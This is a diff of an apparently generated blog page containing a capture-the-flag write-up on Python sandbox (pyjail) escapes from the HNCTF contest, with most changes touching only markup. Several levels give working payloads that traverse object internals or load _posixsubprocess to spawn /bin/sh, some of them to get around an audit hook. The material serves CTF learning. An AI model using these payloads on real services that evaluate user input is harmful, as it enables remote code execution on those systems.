-&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__base__.__subclasses__()[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;].__init__.__globals__[&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;().join([().__doc__[&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;86&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;]])](&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;().join([().__doc__[&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;56&lt;/span&gt;]]))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h3 id=&#34;level-43&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-43&#34;&gt;#&lt;/a&gt; LEVEL 4.3&lt;/h3&gt;
-&lt;p&gt;Quite same as before...&lt;/p&gt;
+&lt;h5 id=&#34;or-rather-use-join&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#or-rather-use-join&#34;&gt;#&lt;/a&gt; Or rather use  &lt;code&gt;join&lt;/code&gt; :&lt;/h5&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__base__.__subclasses__()[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;].__init__.__globals__[&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;().join([().__doc__[&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;86&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;]])](&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;().join([().__doc__[&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;56&lt;/span&gt;]]))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;level-43&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-43&#34;&gt;#&lt;/a&gt; LEVEL 4.3&lt;/h3&gt;
+&lt;p&gt;Quite same as before…&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level4.3wp.png&#34; alt=&#34;level4.3&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&amp;lt;br&amp;gt;&lt;/p&gt;
-&lt;h5 id=&#34;the-next-few-levels-are-become-harder-and-harder&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#the-next-few-levels-are-become-harder-and-harder&#34;&gt;#&lt;/a&gt; The next few levels are become harder and harder.&lt;/h5&gt;
-&lt;p&gt;&amp;lt;br&amp;gt;&lt;/p&gt;
-&lt;h3 id=&#34;level-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-6&#34;&gt;#&lt;/a&gt; LEVEL 6&lt;/h3&gt;
-&lt;h4 id=&#34;repetition&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#repetition&#34;&gt;#&lt;/a&gt; repetition:&lt;/h4&gt;
+&lt;br&gt;
+##### The next few levels are become harder and harder.
+&lt;br&gt;
+&lt;h3 id=&#34;level-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-6&#34;&gt;#&lt;/a&gt; LEVEL 6&lt;/h3&gt;
+&lt;h4 id=&#34;repetition&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#repetition&#34;&gt;#&lt;/a&gt; repetition:&lt;/h4&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level6wp1.png&#34; alt=&#34;level6wp1&#34;&gt;&lt;br&gt;
 &lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level6wp2.png&#34; alt=&#34;level6wp2&#34;&gt;&lt;br&gt;
 &lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level6wp3.png&#34; alt=&#34;level6wp3&#34;&gt;&lt;/p&gt;
-&lt;h5 id=&#34;link-that-may-help-you&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#link-that-may-help-you&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://ctftime.org/writeup/31883&#34;&gt;link that may help you&lt;/a&gt;&lt;/h5&gt;
+&lt;h5 id=&#34;link-that-may-help-you&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#link-that-may-help-you&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://ctftime.org/writeup/31883&#34;&gt;link that may help you&lt;/a&gt;&lt;/h5&gt;
 &lt;p&gt;The basic idea is to RCE with  &lt;code&gt;_posixsubprocess.fork_exec&lt;/code&gt; . If we import it directly, it will trigger the audit hook. But we can pass it by using  &lt;code&gt;__builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;)&lt;/code&gt;  or  &lt;code&gt;__loader__.load_module(&#39;_posixsubprocess&#39;)&lt;/code&gt; . Also, due to its repeatedly exct, we just shell like this:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;import os
 __loader__.load_module(&#39;_posixsubprocess&#39;).fork_exec([b&amp;quot;/bin/sh&amp;quot;], [b&amp;quot;/bin/sh&amp;quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;level-61&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-61&#34;&gt;#&lt;/a&gt; LEVEL 6.1&lt;/h3&gt;
+&lt;h3 id=&#34;level-61&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-61&#34;&gt;#&lt;/a&gt; LEVEL 6.1&lt;/h3&gt;
 &lt;p&gt;This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works.&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level6.1wp.png&#34; alt=&#34;level6.1wp&#34;&gt;&lt;/p&gt;
-&lt;h5 id=&#34;payload-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload-3&#34;&gt;#&lt;/a&gt; payload:&lt;/h5&gt;
+&lt;h5 id=&#34;payload-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#payload-3&#34;&gt;#&lt;/a&gt; payload:&lt;/h5&gt;
 &lt;pre&gt;&lt;code&gt;[os := __import__(&#39;os&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&amp;quot;/bin/sh&amp;quot;], [b&amp;quot;/bin/sh&amp;quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h5 id=&#34;or&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#or&#34;&gt;#&lt;/a&gt; or&lt;/h5&gt;
+&lt;h5 id=&#34;or&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#or&#34;&gt;#&lt;/a&gt; or&lt;/h5&gt;
 &lt;pre&gt;&lt;code&gt;[os := __import__(&#39;os&#39;), itertools := __loader__.load_module(&#39;itertools&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&amp;quot;/bin/sh&amp;quot;], [b&amp;quot;/bin/sh&amp;quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;safeeval&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#safeeval&#34;&gt;#&lt;/a&gt; SAFEEVAL&lt;/h3&gt;
+&lt;h3 id=&#34;safeeval&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#safeeval&#34;&gt;#&lt;/a&gt; SAFEEVAL&lt;/h3&gt;
 &lt;p&gt;Use lambda to wrap up RCE&lt;/p&gt;
 &lt;p&gt;payload:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;(lambda: __import__(&#39;os&#39;).system(&#39;sh&#39;))()
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/safeeval_1.png&#34; alt=&#34;safeeval&#34;&gt;&lt;br&gt;
 &lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/safeeval_2.png&#34; alt=&#34;safeeval&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;level7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level7&#34;&gt;#&lt;/a&gt; LEVEL7&lt;/h3&gt;
-&lt;h6 id=&#34;come-back-later-to-try-to-figure-it-out&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#come-back-later-to-try-to-figure-it-out&#34;&gt;#&lt;/a&gt; Come back later to try to figure it out...&lt;/h6&gt;
+&lt;h3 id=&#34;level7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level7&#34;&gt;#&lt;/a&gt; LEVEL7&lt;/h3&gt;
+&lt;h6 id=&#34;come-back-later-to-try-to-figure-it-out&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#come-back-later-to-try-to-figure-it-out&#34;&gt;#&lt;/a&gt; Come back later to try to figure it out…&lt;/h6&gt;
 &lt;p&gt;payload:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;@exec&lt;br&gt;
@@ -215,14 +215,14 @@ __loader__.load_module(&#39;_posixsubprocess&#39;).fork_exec([b&amp;quot;/bin/sh
 class X: pass&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;import&lt;/strong&gt;(&#39;os&#39;).system(&#39;sh&#39;)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;import&lt;/strong&gt;(‘os’).system(‘sh’)&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h5 id=&#34;blog&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#blog&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://gynvael.coldwind.pl/n/python_sandbox_escape&#34;&gt;blog&lt;/a&gt;&lt;/h5&gt;
+&lt;h5 id=&#34;blog&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#blog&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://gynvael.coldwind.pl/n/python_sandbox_escape&#34;&gt;blog&lt;/a&gt;&lt;/h5&gt;
 &lt;pre&gt;&lt;code&gt;↑# [organizers] Robin_Jadoul solution↑
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level7wp1.png&#34; alt=&#34;level7&#34;&gt;&lt;br&gt;
 &lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level7wp2.png&#34; alt=&#34;level7&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail&#34;&gt;#&lt;/a&gt; Ok, so that&#39;s the end of the hnctf. There are some thing that may help you get further about pyjail:&lt;/h3&gt;
+&lt;h3 id=&#34;ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail&#34;&gt;#&lt;/a&gt; Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:&lt;/h3&gt;
 &lt;pre&gt;&lt;code&gt;https://gynvael.coldwind.pl/n/python_sandbox_escape
 
 https://www.youtube.com/watch?v=Ub_BMOMDOx0
